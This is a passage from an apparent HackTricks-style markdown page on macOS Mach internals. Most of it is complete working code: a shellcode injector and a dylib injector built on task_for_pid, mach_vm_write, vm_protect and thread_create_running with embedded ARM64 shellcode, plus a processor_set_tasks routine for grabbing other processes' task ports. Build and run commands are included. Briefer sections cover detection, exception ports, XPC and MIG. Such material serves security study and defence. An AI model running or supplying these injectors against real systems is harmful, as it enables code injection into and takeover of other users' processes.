        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else
    {

        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }
    
    // Allocate memory for the code
    remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    

    // Write the shellcode to the allocated memory
    kr = mach_vm_write(remoteTask,                   // Task port
	                   remoteCode64,                 // Virtual Address (Destination)
	                   (vm_address_t) injectedCode,  // Source
	                    0xa9);                       // Length of the source


    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
	return (-3);
    }


    // Set the permissions on the allocated code memory
    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
	return (-4);
    }

    // Set the permissions on the allocated stack memory
    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
	
    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
	return (-4);
    }

    // Create thread to run shellcode
    struct arm_unified_thread_state remoteThreadState64;
    thread_act_t         remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
        //remoteStack64 -= 8;  // need alignment of 16

    const char* p = (const char*) remoteCode64;

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

    if (kr != KERN_SUCCESS) {
        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
        return (-3);
    }

    return (0);
}

pid_t pidForProcessName(NSString *processName) {
    NSArray *arguments = @[@"pgrep", processName];
    NSTask *task = [[NSTask alloc] init];
    [task setLaunchPath:@"/usr/bin/env"];
    [task setArguments:arguments];

    NSPipe *pipe = [NSPipe pipe];
    [task setStandardOutput:pipe];

    NSFileHandle *file = [pipe fileHandleForReading];

    [task launch];

    NSData *data = [file readDataToEndOfFile];
    NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

    return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
    NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
    NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
    return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        if (argc < 2) {
            NSLog(@"Usage: %s <pid or process name>", argv[0]);
            return 1;
        }

        NSString *arg = [NSString stringWithUTF8String:argv[1]];
        pid_t pid;

        if (isStringNumeric(arg)) {
            pid = [arg intValue];
        } else {
            pid = pidForProcessName(arg);
            if (pid == 0) {
                NSLog(@"Error: Process named '%@' not found.", arg);
                return 1;
            }
            else{
                printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
            }
        }

        inject(pid);
    }

    return 0;
}
```

</details>

```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```

{% hint style="success" %}
For this to work on iOS you need the entitlement `dynamic-codesigning` in order to be able to make a writable memory executable.
{% endhint %}

### Dylib Injection in thread via Task port

In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previous injection, was generated using Mach api, so **it's not posix compliant**.

It was possible to **inject a simple shellcode** to execute a command because it **didn't need to work with posix** compliant apis, only with Mach. **More complex injections** would need the **thread** to be also **posix compliant**.

Therefore, to **improve the thread** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load a dylib** from the system, so instead of writing new shellcode to perform different actions it's possible to load custom libraries.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>

```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

    // "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

    // Call pthread_set_self

    "\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
    "\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
    "\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
    "\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the 
    "\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
    "\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
    "\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
    "\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
    "\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
    "\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
    "\x00\x00\x00\x14" // loop: b loop              ; loop forever

    // Call dlopen with the path to the library
    "\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
    "\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
    "\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
    "\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
    "\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
    
    // Call pthread_exit
    "\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
    "\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
    "\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
    
    "PTHRDCRT"  // <-
    "PTHRDEXT"  // <-
    "DLOPEN__"  // <- 
    "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB" 
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

    task_t remoteTask;
    struct stat buf;

    // Check if the library exists
    int rc = stat (lib, &buf);

    if (rc != 0)
    {
        fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
        //return (-9);
    }

    // Get access to the task port of the process we want to inject into
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
        return (-1);
    }
    else{
        printf("Gathered privileges over the task port of process: %d\n", pid);
    }

    // Allocate memory for the stack
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else
    {

        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }
    
    // Allocate memory for the code
    remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }

 
    // Patch shellcode

    int i = 0;
    char *possiblePatchLocation = (injectedCode );
    for (i = 0 ; i < 0x100; i++)
    {

        // Patching is crude, but works.
        //
        extern void *_pthread_set_self;
        possiblePatchLocation++;

        
        uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
        uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
        uint64_t addrOfDlopen = (uint64_t) dlopen;

        if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
        {
            memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
            printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
        }

        if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
        {
            memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
            printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
        }

        if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
        {
            printf ("DLOpen @%llx\n", addrOfDlopen);
            memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
        }

        if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
        {
            strcpy(possiblePatchLocation, lib );
        }
    }

	// Write the shellcode to the allocated memory
    kr = mach_vm_write(remoteTask,                   // Task port
	                   remoteCode64,                 // Virtual Address (Destination)
	                   (vm_address_t) injectedCode,  // Source
	                    0xa9);                       // Length of the source


    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
        return (-3);
    }


    // Set the permissions on the allocated code memory
    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
        return (-4);
    }

    // Set the permissions on the allocated stack memory
    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
	
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
        return (-4);
    }


    // Create thread to run shellcode
    struct arm_unified_thread_state remoteThreadState64;
    thread_act_t         remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
        //remoteStack64 -= 8;  // need alignment of 16

    const char* p = (const char*) remoteCode64;

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

    if (kr != KERN_SUCCESS) {
        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
        return (-3);
    }

    return (0);
}



int main(int argc, const char * argv[])
{
    if (argc < 3)
	{
		fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
		fprintf (stderr, "   _action_: path to a dylib on disk\n");
		exit(0);
	}

    pid_t pid = atoi(argv[1]);
    const char *action = argv[2];
    struct stat buf;

    int rc = stat (action, &buf);
    if (rc == 0) inject(pid,action);
    else
    {
        fprintf(stderr,"Dylib not found\n");
    }

}
```

</details>

```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```

### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In this technique a thread of the process is hijacked:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### Task Port Injection Detection

When calling `task_for_pid` or `thread_create_*` increments a counter in the struct task from the kernel which can by accessed from user mode calling task\_info(task, TASK\_EXTMOD\_INFO, ...)

## Exception Ports

When a exception occurs in a thread, this exception is sent to the designated exception port of the thread. If the thread doesn't handle it, then it's sent to the task exception ports. If the task doesn't handle it, then it's sent to the host port which is managed by launchd (where it'll be acknowledge). This is called exception triage.

Note that at the end usually if not properly handle the report will end up being handle by the ReportCrash daemon. However, it's possible for another thread in the same task to manage the exception, this is what crash reporting tools like `PLCreashReporter` does.

## Other Objects

### Clock

Any user can access information about the clock however in order to set the time or modify other settings one has to be root.

In order to get info its possible to call functions from the `clock` subsystem like: `clock_get_time`, `clock_get_attributtes` or `clock_alarm`\
In order to modify values the `clock_priv` subsystem can be sued with functions like `clock_set_time` and `clock_set_attributes`

### Processors and Processor Set

The processor apis allows to control a single logical processor calling functions like `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Moreover, the **processor set** apis provides a way to group multiple processors into a group. It's possible to retrieve the default processor set calling **`processor_set_default`**.\
These are some interesting APIs to interact with the processor set:

* `processor_set_statistics`
* `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
* `processor_set_threads`: Return an array of send rights to all threads inside the processor set
* `processor_set_stack_usage`
* `processor_set_info`

As mentioned in [**this post**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/), in the past this allowed to bypass the previously mentioned protection to get task ports in other processes to control them by calling **`processor_set_tasks`** and getting a host port on every process.\
Nowadays you need root to use that function and this is protected so you will only be able to get these ports on unprotected processes.

You can try it with:

<details>

<summary><strong>processor_set_tasks code</strong></summary>

````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{
  
  host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
  mach_port_t   psDefault;
  mach_port_t   psDefault_control;

  task_array_t  tasks;
  mach_msg_type_number_t numTasks;
  int i;

   thread_array_t       threads;
   thread_info_data_t   tInfo;

  kern_return_t kr;

  kr = processor_set_default(myhost, &psDefault);

  kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
 if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
         mach_error("host_processor_set_priv",kr); exit(1);}

  printf("So far so good\n");

  kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
  if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

  for (i = 0; i < numTasks; i++)
        {
                int pid;
                pid_for_task(tasks[i], &pid);
                printf("TASK %d PID :%d\n", i,pid);
				char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
				if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
					printf("Command line: %s\n", pathbuf);
				} else {
					printf("proc_pidpath failed: %s\n", strerror(errno));
				}
            if (pid == Pid){
                printf("Found\n");
                return (tasks[i]);
            }
        }

   return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
    /*if (argc != 2) {
        fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    if (pid <= 0) {
        fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
        return 1;
    }*/

    int pid = 1;

    task_for_pid_workaround(pid);
    return 0;
}

```
````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
